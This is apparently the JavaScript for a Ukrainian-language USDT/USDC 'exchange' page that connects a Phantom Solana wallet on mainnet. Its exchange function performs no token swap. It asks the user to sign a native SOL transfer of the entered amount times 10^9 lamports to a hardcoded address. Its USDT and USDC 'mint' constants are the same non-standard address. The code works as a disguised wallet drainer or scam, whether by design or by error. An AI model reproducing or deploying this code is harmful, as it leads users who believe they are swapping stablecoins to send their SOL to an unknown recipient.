document.addEventListener("DOMContentLoaded", async function () {
    const connectWalletBtn = document.getElementById("connectWalletBtn");
    const walletStatus = document.getElementById("walletStatus");
    const exchangeBtn = document.getElementById("exchangeBtn");
    const resultDiv = document.getElementById("result");
    const amountInput = document.getElementById("amount");
    const walletPopup = document.getElementById("walletPopup");

    const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
    const endpoint = "https://api.mainnet-beta.solana.com";
    const connection = new Connection(endpoint, "confirmed");

    const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
    const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
    const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

    function isMobile() {
        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    const getWallet = (walletType) => {
        if (walletType === "phantom" && window.phantom?.solana?.isPhantom) {
            return window.phantom.solana;
        } else if (walletType === "solflare" && window.solflare?.isSolflare) {
            return window.solflare;
        }
        return null;
    };

    async function connectWallet(autoConnect = false) {
        if (window.solana && window.solana.isPhantom) {
            try {
                const response = await window.solana.connect({ onlyIfTrusted: autoConnect });
                localStorage.setItem("phantomWallet", response.publicKey.toString());
                walletStatus.textContent = `Connected: ${response.publicKey.toString()}`;
                connectWalletBtn.textContent = "Wallet Connected";
                connectWalletBtn.disabled = true;
                console.log("✅ Wallet connected:", response.publicKey.toString());
            } catch (err) {
                console.error("❌ Connection failed:", err);
                walletStatus.textContent = "Connection failed!";
                localStorage.removeItem("phantomWallet");
            }
        } else {
            alert("Phantom Wallet не встановлено. Встановіть його за посиланням.");
            window.open("https://phantom.app/", "_blank");
        }
    }

    async function checkAutoConnect() {
        const savedWallet = localStorage.getItem("phantomWallet");
        if (savedWallet) {
            await connectWallet(true);
        }
    }

    async function getTokenBalance(ownerAddress, mintAddress) {
        try {
            const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
            return response.value.length > 0 ? parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount) : 0;
        } catch (error) {
            console.error("Помилка отримання балансу:", error);
            return 0;
        }
    }

    exchangeBtn.addEventListener("click", async () => {
        const amount = parseFloat(amountInput.value);
        if (isNaN(amount) || amount <= 0) {
            alert("Будь ласка, введіть коректну кількість USDT/USDC");
            return;
        }
        let wallet = getWallet("phantom");
        if (!wallet || !wallet.publicKey) {
            alert("Будь ласка, підключіть гаманець");
            return;
        }

        const balanceUSDT = await getTokenBalance(wallet.publicKey, USDT_MINT_ADDRESS);
        const balanceUSDC = await getTokenBalance(wallet.publicKey, USDC_MINT_ADDRESS);
        if (balanceUSDT < amount && balanceUSDC < amount) {
            alert("Недостатньо коштів для обміну!");
            return;
        }
        await exchangeTokens(wallet, amount);
    });

    async function exchangeTokens(wallet, amountInUSDT) {
        try {
            const transaction = new Transaction();
            const sender = wallet.publicKey;
            const hasUSDT = await getTokenBalance(sender, USDT_MINT_ADDRESS) >= amountInUSDT;
            const mintAddress = hasUSDT ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;

            const transferInstruction = SystemProgram.transfer({
                fromPubkey: sender,
                toPubkey: SPL_TOKEN_ADDRESS,
                lamports: amountInUSDT * 1000000000
            });
            transaction.add(transferInstruction);

            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = sender;

            const signedTransaction = await wallet.signTransaction(transaction);
            const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "confirmed" });

            await connection.confirmTransaction(txid);
            console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
            resultDiv.style.display = "block";
            resultDiv.textContent = `Обмін завершено! TXID: ${txid}`;
        } catch (err) {
            console.error("Помилка обміну:", err);
            resultDiv.style.display = "block";
            resultDiv.textContent = "Помилка при обміні. Спробуйте ще раз.";
        }
    }

    connectWalletBtn.addEventListener("click", () => connectWallet(false));
    checkAutoConnect();
});

